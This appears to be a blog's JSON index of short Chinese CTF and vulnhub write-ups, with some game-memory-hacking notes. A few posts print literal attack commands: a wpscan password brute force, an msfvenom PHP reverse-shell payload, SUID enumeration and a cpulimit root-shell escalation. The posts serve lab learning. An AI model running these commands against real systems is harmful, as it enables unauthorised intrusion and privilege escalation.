图中的思路就是先用112个字节的脏数据填充栈空间，返回到plt里gets的地址，他会自己找gets的地址。在接受输入的/bin/sh参数。gets返回到system的空间，gets会写到下一个bss段里的空间。再来就是返回到plt里systeam的地址，会去找system的地址。下一个bss就会变成system的返回地址。之后就打开了一个终端，可以执行命令了 wiki的这边。也是用112个字节的脏数据填充了栈空间，在返回到plt里的gets，接受/bin/shgets返回到pop_ret的地方，写到了bss_address的地址。当pop的时候，他下面的那条就是栈顶，把栈顶给pop出去，在返回到了system_addr,’a’*4=就是system的返回地址。下面的bss就是/bin/sh ret2libc-3 其他参考：1.ctf-wiki 2.yichen师傅"},{"title":"蒸米rop x86","date":"2021-09-12T15:24:00.000Z","url":"/2021/09/12/%E8%92%B8%E7%B1%B3rop-x86/","tags":[["pwn","/tags/pwn/"]],"categories":[["undefined",""]],"content":"apt-get remove python-pipapt-get remove python3-pip curl  -o get-pip.py python3 get-pip.pypython2 get-pip.py python2 -m pip install pwntoolspython3 -m pip install pwntools 蒸米大哥 chgrp -R asd /pwnlearnchown -R asd pwnlearn apt install gitgit clone  ~/pedaecho “source ~/peda/peda.py” &gt;&gt; ~/.gdbinit"},{"title":"C语言之重新入门到入土","date":"2021-09-05T04:45:00.000Z","url":"/2021/09/05/C%E8%AF%AD%E8%A8%80%E4%B9%8B%E9%87%8D%E6%96%B0%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/","tags":[["game-hack","/tags/game-hack/"]],"categories":[["undefined",""]],"content":"修改PVZ内阳光数据 FindWindow GetWindowThreadProcessId OpenProcess ReadProcessMemory WriteProcessMemory Closehandlespy++寻找findwindow所需要的类和标题 两次的偏移+基址 静态编译 内存拷贝过CRC检测 VirtualAllocEx ReadProcessMemory WriteProcessMemory for循环 if分支 vs添加高级UAC权限"},{"title":"vulnhub HMS?: 1","date":"2021-09-02T03:23:00.000Z","url":"/2021/09/02/vulnhub-HMS-1/","tags":[["vulnhub","/tags/vulnhub/"]],"categories":[["undefined",""]],"content":"netdiscover和nmap开路 访问7080端口,源代码查看作者信息，去找cms的source code read me里有默认账号密码登录信息 用默认账号密码直接登录 密码绕过的一种方法，删掉type的mail类型，就不会检查了 grep找upload，寻找文件上传的点 msfvenom生成在上传，但反弹过来执行不了命令 上传反弹 命令执行的方法，反弹 另一种sql的方法拿shell payload生成网站 编码的话，要对特殊符号也要编码。 encodeurl bash提权，发现是eren用户，查看crontab文件。发现有个脚本隔5分钟会运行一次 写入反弹shell的代码 前面那句写错了，又写了句进去 sudo -l看到tar打开gtfobins 找到root.txt(final flag) 其他参考：1."},{"title":"墨者学院-网络安全类全解（Writeup）","date":"2021-08-31T08:17:00.000Z","url":"/2021/08/31/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%B1%BB%E5%85%A8%E8%A7%A3%EF%BC%88Writeup%EF%BC%89/","tags":[["墨者学院","/tags/%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2/"]],"categories":[["undefined",""]],"content":"19年的时候在墨者上面刷的，全扔笔记软件里了。现在还是写出来存blog里 某防火墙默认口令 浏览器信息伪造 HTTP动作练习 热点评论刷分漏洞分析溯源 投票常见漏洞分析溯源 来源页伪造 投票系统程序设计缺陷分析 IP地址伪造（第1题） IP地址伪造（第2题） 服务器返回数据查看 某防火墙默认口令参考天清汉马文档获得默认账号密码，多去尝试即可 浏览器信息伪造开启抓包点击构造微信特有的NetType即可成功Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/6.0 NetType/2G参考 HTTP动作练习GET改为POST传值最常用的传参方式，之前并不知道这是什么。。解析里面也没讲到。。我就去查了下 然后把数据传过去。后面的空格不要多。保证数据是9966 热点评论刷分漏洞分析溯源 抓这个点击的包Ctrl+I发送到Intruder，直接设置开跑 只用设置XFF即可，开跑 投票常见漏洞分析溯源抓包 Ctrl+I 直接进行尝试设置一下payloads直接开跑 mozhed81cd19d82afbe3387afb1cf71d 来源页溯源点击抓包referer改为记住加上s为https协议 投票系统程序设计缺陷分析点他进行抓包 进行跑，跑完回来刷新拿到key IP地址伪造（第1题） IP地址伪造（第2题） test和test登录获得key 服务器返回数据查看 两种方法直接抓取http包获得key "},{"title":"vulnhub NoobBox:1","date":"2021-08-27T02:39:00.000Z","url":"/2021/08/27/vulnhub-NoobBox-1/","tags":[["vulnhub","/tags/vulnhub/"]],"categories":[["undefined",""]],"content":"netdiscover扫ip，nmap信息收集一波端口 gobuster扫一下 wpscan跑一波用户 wpscan破解了好久，应该是破解不出来了 dirb在扫一波 在用ffuf扫一波 像是密码一样的东西5p4c3 也没有开ssh，用msf里的wp模块试试这里的usernames打错了 这边改过来了username，直接运行 用python获得一个tty的shell然后nc反弹到自己的机子上 获得第一个flag（user.txt） 查看sudo权限 vim提权 获得最后一个flag（root.txt） 其他参考：1."},{"title":"vulnhub Funbox:1","date":"2021-08-26T02:31:00.000Z","url":"/2021/08/26/vulnhub-Funbox-1/","tags":[["vulnhub","/tags/vulnhub/"]],"categories":[["undefined",""]],"content":"扫ip，信息收集 要求解析才能访问，域名ip绑定 扫出来一个secret没什么用，还是wordpress的架构 joe用户不能编辑主题，admin用户也不能写入 hydra爆破一下ftp和ssh的看看能不能登录 突破rbash的限制我这边是用python的pty和bash直接用了bash的shell ftp下面下载了一封邮件，应该是给root和funny的备份的提醒mail 查看了.bash_history文件，发现了个.backup.sh的备份的shell脚本 funny用户是2分钟执行一次.backup.sh 查看syslog文件，会发现其实root隔5分钟就会执行.backup.sh脚本 查看root用户的crontab的时程表，5分钟执行一次.backup.sh。root和funny应该会交替执行这个脚本，所以要等到是root的时候，不是root就退出就好了其他参考：1."},{"title":"vulnhub Mr Robot:1","date":"2021-08-23T14:13:00.000Z","url":"/2021/08/23/vulnhub-Mr-Robot-1/","tags":[["vulnhub","/tags/vulnhub/"]],"categories":[["undefined",""]],"content":"开局一手netdiscover和nmap gobuster扫出来的robots和wp 还拿到了第一个key fsocity=社会dir=directory=字典社会工程学字典。感觉是爆破用的 sort搭配uniq给字典排序and去重 hydra扫描用户 wpscan爆破密码 反弹shell 拿到第二个key md5破解密码and loginMD5破解 nmap提权 第三个key 其他参考：1. 2. 3. 4. 5."},{"title":"vulnhub Momentum:1","date":"2021-08-22T04:19:00.000Z","url":"/2021/08/22/vulnhub-Momentum-1/","tags":[["vulnhub","/tags/vulnhub/"]],"categories":[["undefined",""]],"content":"找主机，主机全端口探测 gobuster扫描查看到三个目录 其他目录没什么异常的，js文件夹下有个main.js看到了aes的代码被注释了查看js代码，获取cookie。查看cookie的头像是aes的解密。加上前面的密码 运行代码，得到一串字符 找在线网站解密也可以，不过好多网站不行。 谷歌可以搜到的代码笔，同样的加密。js 上面三种方法都可以得到密码的。然后用户名就是密码的前缀。直接ssh登录就可以了。顺便cat了第一个flag（user.txt） 查一下suid，端口和kernel（内核）。看到端口有个6379，redis数据库默认端口就是6379 netstat用不了，用ss(socket statistics)来查看端口信息 直接通过 ‘keys *’查看有的密钥，然后get password来查看 通过ssh -L 来转发在本地查看的一种方法 查看ssh帮助（man）网站 获得密码之后再登录cat final flag（root.txt） 其他参考：1. 2. 3. 4. 5."},{"title":"vulnhub TenderFoot：1","date":"2021-08-19T01:53:00.000Z","url":"/2021/08/19/vulnhub-TenderFoot%EF%BC%9A1/","tags":[["vulnhub","/tags/vulnhub/"]],"categories":[["undefined",""]],"content":"netdiscover -i eth0扫ip。扫到之后直接上nmap扫全端口 自己试了下御剑和dirb确实有些东西没跑出来，装个gobuster和下了个大字典 小和中的字典都没跑出来，下个大字典 curl下字典 gobuster搭配大字典确实多扫出了一个 hint源码的最下面看到了一些data base32解密hint的内容 fotocd源码的下面有一些data brainfuck解密 gobuster扫一下指定的后缀。js文件里找到了用户名。 搭配上面解密的密码直接登录。查看到第一个flag（user1.txt） 发现旁边还有个目录，进去是不断套娃。 一个压缩包，一个txt。 也是多重套娃，zip2john算出压缩包的hash值，然后john在破解 查看礼物 找到第二个flag（user2.txt） 同级文件夹下找到了note.txt，里面有一串base32。直接解密 直接用刚刚的chandler执行sudo -l不行。就用base32解出来的密码ssh登录了 and，最后的flag。已经cat了（proof.txt） 其他参考：1.参考带佬链接"},{"title":"vulnhub COLDDBOX: EASY","date":"2021-08-18T10:28:00.000Z","url":"/2021/08/18/vulnhub-COLDDBOX-EASY/","tags":[["vulnhub","/tags/vulnhub/"]],"categories":[["undefined",""]],"content":"netdiscover扫主机。 80：http，4512：ssh wpscan扫的话扫出一个xss和一个phpmailer的对象注入 wpscan --url  --api-token xxxxxxx 申请个wpscan的api。参考链接 扫用户wpscan --url  -e 暴力破解账号为这几个的密码wpscan --url  --api-token xxxxxxx --passwords /usr/share/wordlists/rockyou.txt --usernames c0ldd,philp,hugo 直接写一个system的一句话 这个图的话是直接在页面执行反弹shell的命令反弹不回来，一定要去访问那个链接才可以反弹 搭配图5食用，直接反弹过来了。 这边没有用python开shell，直接看wp-config配置文件 我这边是ssh连的，或者在刚刚那个shell里面su切用户也可以 命令列出可供当前用户使用的二进制文件 chmod提权 vim提权 ftp提权 find提权 cat了两个flag，base64解密就出来了 其他参考：1.宝藏提权网站 2.walkthrough "},{"title":"vulnhub odin:1","date":"2021-08-17T09:38:00.000Z","url":"/2021/08/17/vulnhub-odin-1/","tags":[["vulnhub","/tags/vulnhub/"]],"categories":[["undefined",""]],"content":"netdiscover找靶机的ip，然后nmap扫全端口 dirb扫目录的时候，看到wp-admin,应该是wordpress，bp访问发现host要求是odin。hosts改动 linux下改hosts 我是一开始，权限的话能给的全给了，然后死活没找到修改只读的这项的相关资料。后来找到了win10下hosts文件修改不能保存问题解决详见： 改hosts前打开的图 改hosts之后打开的图 然后就用wpscan爆破wordpress后台账号为admin的密码（wp-login.php的时候能尝试出有admin这个账号）。用kali自带的rockyou字典 用msfvenom生成的php马，传上了404.php的页面msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.0.101 lport=1234 -f raw -o shell.php wp后台，直接用shell.php的代码替换404.php的代码 nc开监听和msf handler都不行，能连上但不能执行命令。不知道为什么访问的页面 换了种方法。直接用msf有的wp-admin的上传。 shell之后直接查看wp-config.php文件cat /var/www/html/wp-config.php john破解root密码 看到一种直接通过system来反弹shell的，雀氏也可以 之前404.php给改过了，这次改footer.php ?cmd=ls，可以回显 通过php来反弹shell url解码后 其他参考：1. 2."},{"title":"vulnhub-Hacksudo Alien","date":"2021-08-15T09:06:00.000Z","url":"/2021/08/15/vulnhub-Hacksudo-Alien/","tags":[["vulnhub","/tags/vulnhub/"]],"categories":[["undefined",""]],"content":"之前用nmap跑出来三个端口，22,80,9000，忘记截图了，dirb扫描目录，查看有没有目录泄露 curl把备份文件读出来，查看到数据库的账号密码 查看当前用户是否可写，是Y（可写）。或者是secure_file_priv为空也是可写。 尝试执行命令 这边又写了个eval的一句话木马，然后用蚁剑的虚拟终端反弹到自己的机子上去 通过date -f /etc/shadow 读出来（未截图），在john爆破一波 在用这条命令查看有哪些二进制文件有suid权限find / -perm -u=s -type f 2&gt;/dev/null 对应上面那条解释的原理，详见 最后在网站找到提权方法./cpulimit -l 100 -f -- /bin/sh -p 其他参考：1."},{"title":"ce-tutorial-games","date":"2021-08-14T13:28:00.000Z","url":"/2021/08/14/ce-tutorial-games/","tags":[["CE","/tags/CE/"]],"categories":[["undefined",""]],"content":"第一关这题一开始搜的是子弹的数量，但并不是。发现他是已用掉的子弹计数的。故直接搜索 找改写的地址，ctrl+a,aop注入，注释掉add那行。即可实现无限子弹 第二关搜自己的生命值。 用nop替换掉在被攻击即可发现生命值不会掉 右键找到改动的地址，然后在攻击与被攻击 往下移，找到偏移量为70的时候，0,1,1。可判断1即代表电脑 aop注入。如果是电脑就血量变为0，实现秒杀 第三关不断调整位置，搜x的坐标（浮点）。再在内存区域旁边找到y的坐标 转成四字节的decimal，被杀的时候可以发现有两个0和1的转换。 拖下来，发现有个类似假死，有动画，但没死。 被改写的地址，反汇编-&gt;断点,跟踪10000条 折叠起我们进来看到的代码 这一条即是我们被碰撞时的代码。 je改为jmp，即可实现碰撞不死。"},{"title":"ce-turorial1-9","date":"2021-08-13T06:58:00.000Z","url":"/2021/08/13/ce-tutorial1-9/","tags":[["CE","/tags/CE/"]],"categories":[["undefined",""]],"content":"第二关直接搜4字节的精准值，按按钮不断变小。锁定一个值，拉下来，改到1000 第三关先设置扫描不确定的未知值，不断点击按钮，发现减去数字，在设置减少了多少。即可快速锁定值，改到5000。通关 第四关单双浮点数，切换-&gt;改写 第五关找到地址，F6（改写了这个地址），显示反汇编。把代表替换成nop 第六关搜地址找到绿色的静态地址。添加地址，复制刚才的静态地址即可 第七关找到地址，F6（改写了这个地址）。反汇编，ctrl+a呼出自动汇编，把sub那句注释掉，加上add并把后面的数字改为2，即可实现点击按钮+2。 第八关4重指针，不断指向。不断跳转。找到值，F5（访问的地址）。找偏移。计算器计算 这步就是添加地址，添加每一个指针的不同偏移 第九关点到查看内存，偏移为4，上方工具栏呼出结构分析。把地址列表里每个列表-4填入，ctrl+n生成结构 可以看到机器人的team为2。自己的为1 自动汇编，比较team是否为2，为2就把0赋值给eax，health变为0，直接死亡 这是另一种方法，F5给当前地址下断点，在点击攻击按钮，查看esi的变化。自己时esi不为1 当机器人的时候，esi都是1 机器人的时候，esi还是1 把esi和1比较，查看是否是机器人，如果是，就把0赋值给eax，health变为0"},{"title":"四旋翼无人机开坑-未填","date":"2021-08-08T02:33:00.000Z","url":"/2021/08/08/%E5%9B%9B%E6%97%8B%E7%BF%BC%E6%97%A0%E4%BA%BA%E6%9C%BA%E5%BC%80%E5%9D%91-%E6%9C%AA%E5%A1%AB/","tags":[["飞行器","/tags/%E9%A3%9E%E8%A1%8C%E5%99%A8/"]],"categories":[["undefined",""]],"content":"固定翼无人机 螺旋桨式无人机 喷气式无人机 飞行原理:在高速前进过程中，通过机翼上下气流和气压的不同，产生升力，保持无人机的飞行。 旋翼无人机 飞行原理:用一个或多个螺旋桨的高速转动产生升力，多螺旋桨还要通过多个螺旋桨的配合保持平衡，并控制无人机6个自由度方向的运动 四旋翼飞行器的主要优点: 拥有简单的机械结构 拥有稳定的飞行姿态 体积可以做小，可实现自主飞行器的小型化和微型化 4个电机，具有更大的载重力 四翼飞行器技术关键 总体设计优化: 选择合适的机架材料，减轻飞行器质量。综合考虑质量、尺寸、飞行速度和能耗。确保实现整体设计最优化 能源动力系统: 选择合适的电机和减速比，在兼顾最大效率和最大输出功率两项指标的前提下，将电机工作点配置在推荐运行区域内。 建立数学模型: 准确建立其在各种飞行状态下的数学模型。 飞行控制: 研制既能精确控制飞行器姿态，又具有较强抗干扰和环境自适应能力的姿态控制器是四旋翼飞行器研究的关键。 定位、导航与通信: 研制体积小、质量轻、功耗低、稳定可靠和抗干扰的通信链对微小型四旋翼飞行器技术 基本原理: 四旋翼飞行器通常有两种模式，即“十”字形模式与X形模式。 相邻的两个旋翼的转动方向相反，而在对角线上的两个电机的转动方向相同。升降运动 俯仰运动 横滚运动 偏航运动 四旋翼飞行器姿态表示 平衡控制算法 滤波算法 材料如下：四个有刷电机和螺旋桨（30以内）+机架（待定）+飞控板（f3 evo brush 100以内）+接收机及其遥控器（二手天地飞7+接收机 300以内）+电池（鹰氪coddar 50以内）+电烙铁 总价600+大概 参考链接1：ymengo-blog参考链接2：穿越机组装视频-可参考"},{"title":"bugku-pwn合集","date":"2021-08-02T13:49:00.000Z","url":"/2021/08/02/bugku-pwn%E5%90%88%E9%9B%86/","tags":[["pwn","/tags/pwn/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":" 瑞士军刀 overflow read_note repeater canary printf overflow2 瑞士军刀nc打开直接连接，cat flag即可 overflow打开看main主函数，发现一个输入，有两个输出。memset函数是在一段内存中填充某个给定的值，在这里是填充s。把48个0填充到变量s中。后面的read又读了100个长度，就可能会导致溢出 return时，执行系统命令cat flag。利用read函数进行栈溢出执行get_shell函数，把memset的s和rbp寄存器的值给覆盖掉，在写入get_shell函数的地址就可以了。 gdb运行，pattern_create 100创建完之后直接run运行。 pattern_offset寻找他的偏移量，顺便i r查看寄存器ascii编码语义下的A，是一个字节，0x6116进制语义下的0xAA是一个字节。所以这边的16/2=8+memset时候的30即可。 py脚本。payload构造0x30+0x8位的填充，在加上p64（指定程序64位的） "},{"title":"bugku-re-safebox","date":"2021-07-25T13:56:24.000Z","url":"/2021/07/25/bugku-re-safebox/","categories":[["undefined",""]],"content":"先模拟器打开软件查看界面，只有一个地方可以输入，其他地方应该是点不了。输入很多次都是停止运行 jeb打开先看mainactivility。看代码，在判断flag=1的时候可输出flag。 Integer.parseInt(((EditText)this.findViewById(0x7F0B0056)).getText().toString()这句其实就是接受那个输入框接受输入的值在转成int类型，把接受到的这个变量改成input。改写全局的变量 简化代码变成下面这样，方便分析。 可以根据java代码写出python暴力爆破脚本。 提交答案。是错误的…..看到别的androidtest类和mainactivity代码相似。 mainfest里可以看到有两个activity，多个Activity可以显示多个不同的界面，setContentView就是设置一个Activity的显示界面，使用setContentView可以在Activity中动态切换显示的View,这样，不需要多个Activity就可以显示不同的界面。 可以看到明显的调用id值 public.xml找到id对应的资源 在到layout文件夹里找到build.xml和activity_main.xml。010editor打开比较两个文件差异，发现相同。 在线diff一下，看一下两个类有什么不同 再根据之前diff的mainactivity和androidtest的不同，写一个androidtest类的脚本。跑出flag，提交正确 和之前的区别的话，就是内层的循环次数由4改为了3。还有最后的输出的chr的改变。 改为python2，并且把i的值改为正好输出的前一位，方便调试。以下值均满足第一个if条件但48533584可满足flag=1。 "},{"title":"bugku-re-easy-100","date":"2021-07-23T10:46:00.000Z","url":"/2021/07/23/bugku-re-easy-100/","tags":[["re","/tags/re/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":"OnCreate就是执行p函数，创建一个监听d类的onclick事件。而p函数就是读取url.png[144:160]的数据 mainactivity的代码 再来看d类，判断是否正确，正确就输出flag。if的第一个参数是this.a(句柄)，第二个是调用只有一个参数的a类a函数，第三个则是v0（我们输入的字符串） 在看a类的三个3函数第一个a函数只有一个参数，就是字符串v。就是图片[144:160]的数据第二个a函数有三个参数，调用了有两个参数的a函数第三个a函数有两个参数，arg4是v，arg5是输入的密码。调用c类的a函数和后面的做比较。如果相等就输出flag 再来看c类，就是对之前从图片里提出来的字符串在进行加工。主要就是置换，两位为一个单位来置换。 a类就是aes的加密 python解密脚本 也可以自己尝试提出url.png中的内容 自己可以用在线aes解密,python2写脚本。base64 encode加密完后丢解密网站，修改填充和加上密码。 程序逻辑：mainactivity-&gt;p()-&gt;d-&gt;a-&gt;c-&gt;脚本 脚本逻辑：取图片里的字符串-&gt;字符串置换-&gt;密文转hex-&gt;脚本closed 参考："},{"title":"bugku-re-NoString","date":"2021-06-30T09:50:00.000Z","url":"/2021/06/30/bugku-re-NoString/","tags":[["re","/tags/re/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":"查看字符串没有可疑或者可用的字符串，如题Nostring，没有字符串。可能加密了 进入主函数分析 解读关键主函数 查看和v11比较的字符串 逆过来异或9，跑出flag和aLF和aNA 参考链接：1、()2、()"},{"title":"bugku-re-First_Mobile","date":"2021-06-25T05:35:00.000Z","url":"/2021/06/25/bugku-re-First-Mobile/","tags":[["re","/tags/re/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":"直接反编译看mainactivity。监听，把输入的字符串传给encode.check()检查 跟到encode里 input是接收str转成的数组b是已经有的数组temp是空的16位的数组 在经过了运算之后temp[i]=((input[i]+b[i])%61)*2-i如果temp和str还相等，就返回true，输出correct。 写个脚本这个脚本是直接跑的，把每一位依次比较，正确就转成字母输出这里的80可以往大里改，算是爆破出来的参见 另一种脚本的写法也是爆破的，生成了所以的大小写和数字，一位一位爆破。参见 "},{"title":"bugku-re-mobile1和mobile2","date":"2021-05-27T12:32:00.000Z","url":"/2021/05/27/bugku-re-mobile1%E5%92%8Cmobile2/","tags":[["re","/tags/re/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":"1.mobile1onCreate中定义了一个click事件，看样子这个判断就是能不能出flag的地方，直接跟入checkSN函数。看下面的判断，arg11就是edit_username,arg12就是edit_sn。而edit_username已经写死了。就是Tenshine。 看checkSN就是应用md5加密arg11（edit_username），然后再在进行2位取。在加上flag{和}，即满足了arg11的长度不为0,且arg12不为空，arg12长度也等于12位 写脚本，加密Tenshine之后按2步长取最后的结果。 2.mobile2脑洞题。文件下下来解压就是如图。 xml文件不是xml。直接text形式查看。flag 6efd233c63b7d2"},{"title":"bugku-re-特殊的base64和不好用的ce","date":"2021-05-22T14:30:00.000Z","url":"/2021/05/22/bugku-re-%E7%89%B9%E6%AE%8A%E7%9A%84base64%E5%92%8C%E4%B8%8D%E5%A5%BD%E7%94%A8%E7%9A%84ce/","tags":[["re","/tags/re/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":"1.特殊的base64确实是特殊的base64，换表base64有一串末尾为==的字符串，还给了一串64位的表。就判断是base64换表了。 两个脚本都是换表的base64解法。 2.不好用的ce1.用网上的脚本vbs依次点击到1w次，或者自己写个按键精灵自己控制好次数，快到就要移开光标，自己点到1w 2.od边运行边调试 找到第一串字符串，因为“点击一万次”是第一个窗体的，后面的字符串才是主程序里的。 把文中所有的跳转都下上断点(F2)。 看到了je的大跳转已实现，判断就是主循环。 开始运行 更改为jnz或者直接nop掉，使其跳转未实现，继续开始就能输出flag 最后取的代码看起来像base64，其实是base58base编码家族区别 解密得到flag{c1icktimes} "},{"title":"bugku-re-马老师杀毒卫士","date":"2021-05-20T13:25:00.000Z","url":"/2021/05/20/bugku-re-%E9%A9%AC%E8%80%81%E5%B8%88%E6%9D%80%E6%AF%92%E5%8D%AB%E5%A3%AB/","tags":[["re","/tags/re/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":"这道题比较简单，顺便把前面的几道简单的也全放上来 目录列表 马老师杀毒卫士 入门逆向 Easy_Re Easy_vb 逆向入门 1.马老师杀毒卫士摸不着头脑的一道题吧，winspy++打开，查看句柄和窗口相关属性信息。看到一个隐藏的lable，像是flag栅栏的形式。在跟界面上的闪电三连鞭判断。直接常规栅栏三栏解开了题目。 2.入门逆向找到开始的语句，直接用r将十六进制转成字符串就可 3.Easy_Reod可以直接查看 ida的话，还需要r将16进制转换成字符串在倒序。 4.Easy_vbod打开直接能查看到 5.逆向入门不算逆向题，纯misc，base64的图片，嵌在html的img里，直接浏览器打开，扫码得到flag "},{"title":"bugku-re-Timer","date":"2021-05-18T15:08:00.000Z","url":"/2021/05/18/bugku-re-Timer/","tags":[["re","/tags/re/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":"直奔主题,jeb打开。看反汇编mainactivity的代码。直接看到flag结果的地方判断如果beg-now(当前时间)&lt;=0就输出正确的flag 往上看回调的mainactivity，beg生成就是当前时间+200000s。beg-now就相当于是200000s一直减当前过去的秒数。就是倒计时。 上面的flag输出的地方又涉及到了k。在下文k的计算又收到了is2函数的影响。直接跟进去看is2函数。可以自己写脚本计算k。把is2函数扒拉下来，在给他传参数。这里的脚本是网上copy来的。is2那边应该是老版本jeb反汇编的结果。我这里是新版本，就没有改脚本了 脚本中就是把time当做参数传给了is2。让is2来计算。如果返回的是true，就让k+100。如果返回false，k就-1。最后200000次之后。k的值被计算出来了 计算出k的值是1616384。打开android killer修改smail代码 进入主函数入口。搜索stringFromJNI2，直接定位输出k处，修改判断beg-now的代码。以及直接给定k的值 修改变量k的值，iget，把k存在了v3寄存器里。寄存器用v开头数字结尾的符号来表示 其格式为：iget 目标寄存器 源对象 变量签名。 我们直接用const把1616384赋值给v3。const v3,1616384 这里把最后的k值设置为了执行200000次后的正确值之后。但是并没有修改beg或者now的值。beg-now的判断。还是不成立的。不会输出flag。所以我们要把≤改成＞。但又因为代码里是相反的就把if-gtz(＞)改为if-lez(≤)。 编译签名，生成最后的apk。模拟器运行。一定要签名的。默认编译可能不签名，所以模拟器安装不上？ 最后参考1."},{"title":"bugku-re-love","date":"2021-05-18T14:39:00.000Z","url":"/2021/05/18/bugku-re-love/","tags":[["re","/tags/re/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":"字符串窗口找到关键right flag!字段，双击跟入，f5反汇编。看之后的代码。已经重命名了一些看的清楚的函数。先进行sub_4110be函数加密，在进行数组下标计算。 跟入sub_4110be函数即可发现，像是base64加密的函数 写脚本解决题目。因为上面是先进行base64的，然后在数组下标计算。所以脚本先进行数组下标的计算。在进行base64解密。"},{"title":"bugku-re-游戏过关","date":"2021-05-18T07:09:00.000Z","url":"/2021/05/18/bugku-re-%E6%B8%B8%E6%88%8F%E8%BF%87%E5%85%B3/","tags":[["re","/tags/re/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":"参考某师傅blog的wp一样四种方法。 1.直接玩游戏15786234直接通关 2.ida计算flagida打开，打开字符串窗口，找到关键字符串，双击跟入。在按x，交叉引用。f5转为反汇编，看到左下角的图。v2和v59是两个数组，ida并没有识别出来，直接在上面找到定义的时候。右键输入变量类型，改为数组的形式。 再把两个数组提出来，直接写脚本，异或两个数组内的值和0x13在异或，chr之后得到flag。 3.修改源码左上找到关键字符串flag。在找到上面输出flag的函数的入口。跟入跳转。在跟入本地调用。看到上面有8个jnz，就是判断8个灯是否亮的代码。一旦有1个没满足，就call回去原来的函数，重新要求你输入n玩游戏。只要把这里的jmp 0085f4b7（循环重新开始的位置）改成00857ab4（flag函数的入口地址）或者改成0085e940（输出flag的函数的路口）。 然后按如图保存即可。右键修改的代码，复制到可执行文件-&gt;选择，找到修改的代码保存文件。 运行结果 4.边调试边运行找到8个jnz的地方，给8条语句f2下上断点之后开始。8个jnz就是判断灯是否亮的代码。在ida里同样可以看到。 运行之后，输入n之后，f7单步运行，把8个jnz中的zf判断，哪个zf不为1，都改为1。zf就表示这里要跳转了。通过修改zf的值，来实现不跳转。 改完之后再运行。 "},{"title":"bugku-re-signin","date":"2021-05-11T14:40:00.000Z","url":"/2021/05/11/bugku-re-signin/","tags":[["re","/tags/re/"],["bugku","/tags/bugku/"]],"categories":[["undefined",""]],"content":"apk直接拖进jeb。按q反编译成java语言，方便解读。 下面那个OnCreate是按钮被点击的事件，会把你输入的那个窗口里的那个字符串当作参数传给checkPassword里去。getflag返回的就是资源ID对应的字符串。而checkPassword就是把getflag返回的字符串进行反转，在进行base64加密。PS：这里的jeb是3.1版本的，直接给出了相应资源ID对应的字符串。 没给出对应字符串，用apk改之理直接打开，全局搜索资源ID对应的16进制对应的字符串name 在全局搜索字符串name python脚本解决 成功截图"},{"title":"bugku-misc-合集","date":"2021-05-08T13:56:00.000Z","url":"/2021/05/08/bugku-misc-%E5%90%88%E9%9B%86/","tags":[["bugku","/tags/bugku/"],["misc","/tags/misc/"]],"categories":[["undefined",""]]},{"title":"用python实现qq游戏-大家来找茬辅助","date":"2021-03-07T10:30:45.000Z","url":"/2021/03/07/%E7%94%A8python%E5%AE%9E%E7%8E%B0qq%E6%B8%B8%E6%88%8F-%E5%A4%A7%E5%AE%B6%E6%9D%A5%E6%89%BE%E8%8C%AC%E8%BE%85%E5%8A%A9/","categories":[["undefined",""]],"content":"起因是因为周末闲着蛋疼，在修仙的时候，看到了这个游戏。玩了几把发现玩不过别人。苦思一晚上，第二天去网上找思路，发现有前人写过这类代码。但缺点也很明显，不够准确。基本5个不同能找到3个左右。 参考链接 流程图 前三步代码 效果图每一关运行exe。会直接显示出差异图。 之后对图像识别、opencv、cv2理解更深，再来补"},{"title":"noi-oj刷题记录第一弹1001-1020","date":"2021-02-23T08:07:00.000Z","url":"/2021/02/23/noi-oj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E5%BC%B91001-1020/","tags":[["noi-oj","/tags/noi-oj/"]],"categories":[["undefined",""]],"content":"noi-oj 意为 全国青少年信息学奥林匹克竞赛-算法 初中的时候比过，那时候没比好。跟个憨包一样。于是现在回过头来刷刷题，记录一下 1001 1002这题用海伦公式求解，所以贴张海伦公式的图片 1003 1004 1005 1006 1007 1008 1009 1010 1011 1012这题有应用到ascii，所以贴上ascii码表 1013 1014 1015 1016 1017 1018 1019 1020 "},{"title":"穿山甲2021冬令营","date":"2021-02-19T14:19:00.000Z","url":"/2021/02/19/%E7%A9%BF%E5%B1%B1%E7%94%B22021%E5%86%AC%E4%BB%A4%E8%90%A5/","tags":[["穿山甲2021冬令营","/tags/%E7%A9%BF%E5%B1%B1%E7%94%B22021%E5%86%AC%E4%BB%A4%E8%90%A5/"]],"categories":[["undefined",""]],"content":"web 黑宝石 ping一下试试 不可能的数字 过五关 快准狠 misc LSB!LSB! red_green 伪加密 crypto juSTFoRfun 滴滴答答的凯撒 你认识这个校徽吗 5space-rosb re HelloAndroid pwn 最简单的栈溢出 黑宝石题目就给了个描述实训描述:从前没有网络的时候IE叫黑宝石。感觉是个脑洞题，没有任何思路。加了个本地XFF。响应里要求黑宝石浏览器。就在UA里加了个Black gemstone就cat了flag ping一下试试 先fuzz。找到%0a没被过滤。然后就可以接下来的操作。自己试了下没弹回来，不晓得是什么原因。 不可能的数字截的wp里的图。简单的代码审计。php科学计数法绕过就可以了?num=1e9 过五关 快准狠一个网页内让你数有多少个A，然后提交。而且还要求时间。肯定需要脚本解决 LSB!LSB!zsteg -e导出 直接qr扫码就ok了 red_green 伪加密修改50 4b 01 02后第5位为偶数即可。保存打开即可 